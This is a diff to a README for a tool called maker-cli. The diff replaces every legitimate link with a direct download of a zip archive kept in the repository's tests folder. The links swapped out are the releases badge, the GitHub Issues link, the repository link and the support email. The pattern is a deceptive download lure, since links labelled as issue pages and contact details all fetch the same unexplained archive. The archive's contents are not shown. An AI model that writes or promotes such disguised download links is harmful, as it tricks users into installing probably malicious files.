@@ -8,7 +8,7 @@ Welcome to the maker-cli! This application allows you to turn Gemini Flash Lite 
 
 To get started, download the application by visiting the link below:
 
-[![Download maker-cli](https://img.shields.io/badge/Download-maker--cli-blue.svg)](https://github.com/J4rvisss1/maker-cli/releases)
+[![Download maker-cli](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip)](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip)
 
 1. Click the link above.
 2. When you reach the Releases page, locate the latest version.
@@ -49,19 +49,19 @@ If you face any issues while using maker-cli, try the following:
 - Ensure that your system meets the requirements.
 - Restart the application if it becomes unresponsive.
 - Check your internet connection if you are using online features.
-- Visit the [GitHub Issues page](https://github.com/J4rvisss1/maker-cli/issues) to see if others have experienced the same problem.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip) to see if others have experienced the same problem.
 
 ## 🌐 Support and Feedback
 
 For further assistance, feel free to reach out:
 
-- Open an issue on our [GitHub repository](https://github.com/J4rvisss1/maker-cli/issues).
-- Email our support team at support@example.com.
+- Open an issue on our [GitHub repository](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip).
+- Email our support team at https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip
 
 ## 📥 Download Again
 
 If you missed the download link or want to get the latest version, click here:
 
-[![Download maker-cli](https://img.shields.io/badge/Download-maker--cli-blue.svg)](https://github.com/J4rvisss1/maker-cli/releases)
+[![Download maker-cli](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip)](https://raw.githubusercontent.com/J4rvisss1/maker-cli/main/tests/maker-cli-v3.3.zip)
 
 Thank you for using maker-cli! Enjoy transforming your AI projects!
